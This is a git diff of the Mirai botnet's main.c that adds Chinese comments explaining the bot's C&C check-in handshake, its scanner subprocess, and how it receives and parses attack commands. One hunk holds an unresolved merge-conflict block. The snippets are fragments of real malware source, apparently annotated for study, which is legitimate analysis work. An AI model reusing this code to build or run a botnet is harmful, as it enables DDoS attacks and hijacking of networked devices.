@@ -157,7 +157,8 @@ int main(int argc, char **args)
     killer_init();
 #ifndef DEBUG
 #ifdef MIRAI_TELNET
-    scanner_init();//扫描子进程
+    scanner_init();  //fork一个子进程去扫描然后上报
+
 #endif
 #endif
 
@@ -230,7 +231,7 @@ int main(int argc, char **args)
         }
 
         // Check if CNC connection was established or timed out or errored
-        if (pending_connection)
+        if (pending_connection)//正在建立与cnc的连接
         {
             pending_connection = FALSE;
 
@@ -261,7 +262,7 @@ int main(int argc, char **args)
                     uint8_t id_len = util_strlen(id_buf);
 
                     LOCAL_ADDR = util_local_addr();
-                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
+                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);//先发送00 00 00 01 表示上线
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
                     {
@@ -281,7 +282,7 @@ int main(int argc, char **args)
 
             // Try to read in buffer length from CNC
             errno = 0;
-            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
+            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);//接收
             if (n == -1)
             {
                 if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
@@ -337,14 +338,14 @@ int main(int argc, char **args)
             // Actually read buffer length and buffer data
             recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
             len = ntohs(len);
-            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
+            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);//接收到攻击指令
 
 #ifdef DEBUG
             printf("[main] Received %d bytes from CNC\n", len);
 #endif
 
             if (len > 0)
-                attack_parse(rdbuf, len);
+                attack_parse(rdbuf, len);//解析出攻击指令
         }
     }
 
@@ -409,8 +410,12 @@ static void establish_connection(void)
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
 }
 
+<<<<<<< HEAD
 
 //关闭与CNC的连接
+=======
+//断开与CNC的连接
+>>>>>>> 1c1ee4590de0f564774b0eefe76f70b38bd2e176
 static void teardown_connection(void)
 {
 #ifdef DEBUG
